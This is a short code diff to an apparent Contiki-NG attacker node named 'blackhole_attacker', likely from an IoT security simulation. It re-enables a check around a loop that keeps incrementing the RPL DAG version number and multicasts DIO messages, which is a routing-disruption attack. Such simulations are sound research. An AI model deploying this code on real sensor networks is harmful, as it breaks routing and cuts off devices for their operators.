@@ -26,7 +26,7 @@ AUTOSTART_PROCESSES(&blackhole_attacker);
 PROCESS_THREAD(blackhole_attacker, ev, data)
 {
   static struct etimer periodic_timer;
-  // uip_ipaddr_t root_ipaddr;
+  uip_ipaddr_t root_ipaddr;
   // uip_ipaddr_t multicast_ipaddr;
 
   // uip_ip6addr(&multicast_ipaddr, 0xff02, 0, 0, 0, 0, 0, 0, 0x1a);
@@ -39,14 +39,14 @@ PROCESS_THREAD(blackhole_attacker, ev, data)
     PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
     etimer_reset(&periodic_timer);
 
-    // if (NETSTACK_ROUTING.node_is_reachable()
-    //   && NETSTACK_ROUTING.get_root_ipaddr(&root_ipaddr)
-    //   && curr_instance.dag.version)
-    // {
+    if (NETSTACK_ROUTING.node_is_reachable()
+      && NETSTACK_ROUTING.get_root_ipaddr(&root_ipaddr)
+      && curr_instance.dag.version)
+    {
       curr_instance.dag.version = (curr_instance.dag.version + 1) % 256;
       rpl_icmp6_dio_output(&rpl_multicast_addr);
       LOG_INFO("Sent DIO with version number: %d\n", curr_instance.dag.version);
-    // }
+    }
   }
 
   PROCESS_END();
